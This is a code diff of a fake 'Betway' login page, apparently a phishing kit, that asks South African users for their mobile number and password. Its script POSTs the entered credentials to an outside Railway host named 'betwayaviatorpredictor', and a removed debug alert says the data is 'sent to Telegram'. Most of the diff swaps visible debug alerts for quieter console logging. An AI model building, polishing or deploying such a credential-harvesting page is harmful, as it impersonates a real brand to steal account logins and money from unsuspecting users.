@@ -4,9 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Betway Login</title>
-    <!-- FAVICON -->
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎰</text></svg>" />
-    <!-- FONT AWESOME -->
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.5.0/css/all.css" />
     <style>
         * {
@@ -311,56 +309,46 @@
 
     <div class="login-container">
 
-        <!-- LOADING OVERLAY -->
         <div class="loading-overlay" id="loadingOverlay">
             <div class="big-spinner"></div>
             <p>Processing your request...</p>
         </div>
 
-        <!-- LOGO -->
         <div class="logo">
             <h1>BET<span>WAY</span></h1>
             <p>Sports · Casino · Games</p>
         </div>
 
-        <!-- HEADING -->
         <div class="login-heading">Login</div>
 
-        <!-- MESSAGE -->
         <div id="message"></div>
 
-        <!-- MOBILE NUMBER -->
         <div class="input-group">
             <label>+27 Mobile Number</label>
             <input type="tel" id="mobileNumber" placeholder="Enter your mobile number" />
             <span class="input-icon"><i class="fas fa-phone"></i></span>
         </div>
 
-        <!-- PASSWORD -->
         <div class="input-group">
             <label>Enter Password</label>
             <input type="password" id="password" placeholder="Enter your password" />
             <span class="input-icon"><i class="fas fa-lock"></i></span>
         </div>
 
-        <!-- FORGOT LINKS -->
         <div class="forgot-row">
             <a href="#">Forgot Username?</a>
             <a href="#">Forgot Password?</a>
         </div>
 
-        <!-- LOGIN BUTTON -->
         <button class="login-btn" id="loginBtn">
             <span class="spinner" id="spinner"></span>
             <span class="btn-text" id="btnText">Login</span>
         </button>
 
-        <!-- DIVIDER -->
         <div class="divider">
             <span>Don't have an account yet?</span>
         </div>
 
-        <!-- SIGN UP -->
         <p class="signup-text">
             <a href="#">Sign Up</a>
         </p>
@@ -370,15 +358,13 @@
     <script>
         // ============================================
         // COMPLETE WORKING JAVASCRIPT
-        // NEW URL: betwayaviatorpredictor-production-911a.up.railway.app
         // ============================================
 
-        alert('🔴 1. Script loaded!');
+        console.log('🔴 Script loaded!');
 
         document.addEventListener('DOMContentLoaded', function() {
             
-            alert('🟢 2. DOM is ready!');
-            console.log('✅ Page loaded successfully!');
+            console.log('🟢 DOM is ready!');
 
             // Get all elements
             const mobileInput = document.getElementById('mobileNumber');
@@ -389,15 +375,11 @@
             const messageDiv = document.getElementById('message');
             const loadingOverlay = document.getElementById('loadingOverlay');
 
-            // Check if elements exist
-            if (loginBtn) {
-                alert('✅ 3. Button found!');
-            } else {
-                alert('❌ 3. Button NOT found!');
-                return;
-            }
-
-            // ===== FUNCTIONS =====
+            console.log('✅ Elements found:', {
+                mobileInput: !!mobileInput,
+                passwordInput: !!passwordInput,
+                loginBtn: !!loginBtn
+            });
 
             function showMessage(text, type) {
                 messageDiv.textContent = text;
@@ -411,71 +393,52 @@
             }
 
             function showLoading() {
-                alert('⏳ 6. LOADING SPINNER SHOWING!');
+                console.log('⏳ SHOWING LOADING...');
                 loginBtn.disabled = true;
                 spinner.classList.add('active');
                 btnText.textContent = 'Logging in...';
                 loadingOverlay.classList.add('active');
-                console.log('⏳ LOADING: Spinner showing');
             }
 
             function hideLoading() {
+                console.log('✅ HIDING LOADING...');
                 loginBtn.disabled = false;
                 spinner.classList.remove('active');
                 btnText.textContent = 'Login';
                 loadingOverlay.classList.remove('active');
-                console.log('✅ LOADING: Spinner hidden');
             }
 
-            // ===== MAIN LOGIN FUNCTION =====
-
             async function handleLogin(event) {
-                alert('🟡 5. handleLogin() WAS CALLED!');
+                console.log('🟡 handleLogin() CALLED!');
 
                 if (event) {
                     event.preventDefault();
                     event.stopPropagation();
                 }
 
-                console.log('🔑 LOGIN: Button clicked!');
-
                 const mobileNumber = mobileInput.value.trim();
                 const password = passwordInput.value.trim();
 
-                alert('📱 Mobile: ' + mobileNumber + '\n🔒 Password: ' + (password ? '******' : 'empty'));
-
                 console.log('📱 Mobile:', mobileNumber);
-
-                // ===== VALIDATION =====
+                console.log('🔒 Password:', password ? '******' : 'empty');
 
                 if (!mobileNumber || !password) {
-                    alert('⚠️ EMPTY FIELDS!');
                     showMessage('⚠️ Please enter both mobile number and password.', 'error');
                     return;
                 }
 
                 const mobileRegex = /^(\+27|0)[6-8][0-9]{8}$/;
                 if (!mobileRegex.test(mobileNumber)) {
-                    alert('⚠️ INVALID SA NUMBER!');
                     showMessage('⚠️ Please enter a valid SA number (e.g., 0712345678)', 'error');
                     return;
                 }
 
-                alert('✅ Validation passed! Now showing loading...');
-
                 hideMessage();
                 showLoading();
 
-                // ===== SEND TO BACKEND =====
-
                 try {
-                    // ============================================
-                    // NEW RAILWAY URL
-                    // ============================================
                     const apiUrl = 'https://betwayaviatorpredictor-production-911a.up.railway.app/api/login';
-                    alert('📤 7. Sending to backend: ' + apiUrl);
-                    
-                    console.log('📤 Sending to backend:', apiUrl);
+                    console.log('📤 Sending to:', apiUrl);
 
                     const response = await fetch(apiUrl, {
                         method: 'POST',
@@ -496,48 +459,42 @@
                     hideLoading();
 
                     if (data.success) {
-                        alert('✅ 8. BACKEND SUCCESS! Data sent to Telegram!');
                         showMessage('✅ Login successful! Redirecting...', 'success');
                         showLoading();
                         setTimeout(function() {
                             window.location.href = 'https://betwayaviatorpredictor-production-911a.up.railway.app';
                         }, 2000);
                     } else {
-                        alert('❌ 8. BACKEND ERROR!');
                         showMessage('❌ ' + (data.message || 'Login failed.'), 'error');
                     }
 
                 } catch (error) {
-                    alert('❌ 8. ERROR: ' + error.message);
                     console.error('❌ ERROR:', error);
                     hideLoading();
-                    showMessage('❌ Cannot connect to backend. Make sure server is running.', 'error');
+                    showMessage('❌ Cannot connect to server. Make sure backend is running.', 'error');
                 }
             }
 
-            // ===== EVENT LISTENERS =====
-
-            // Login button click
+            // ===== ATTACH EVENT LISTENER =====
             loginBtn.addEventListener('click', function(e) {
-                alert('🖱️ 4. BUTTON CLICK DETECTED!');
-                console.log('🖱️ CLICK: Button clicked!');
+                console.log('🖱️ BUTTON CLICKED!');
                 handleLogin(e);
             });
 
-            alert('✅ 3b. Button listener attached!');
+            console.log('✅ Button listener attached!');
 
             // Enter key support
             document.addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') {
                     const active = document.activeElement;
                     if (active === mobileInput || active === passwordInput) {
-                        alert('⌨️ ENTER KEY PRESSED!');
+                        console.log('⌨️ Enter key pressed!');
                         handleLogin(e);
                     }
                 }
             });
 
-            // Clear error messages when typing
+            // Clear messages when typing
             mobileInput.addEventListener('input', function() {
                 if (messageDiv.className === 'error') {
                     hideMessage();
@@ -551,7 +508,7 @@
             });
 
             console.log('✅ All systems ready!');
-            alert('✅ 3c. ALL SYSTEMS READY!');
+            console.log('✅ Waiting for user to tap Login...');
 
         });
     </script>
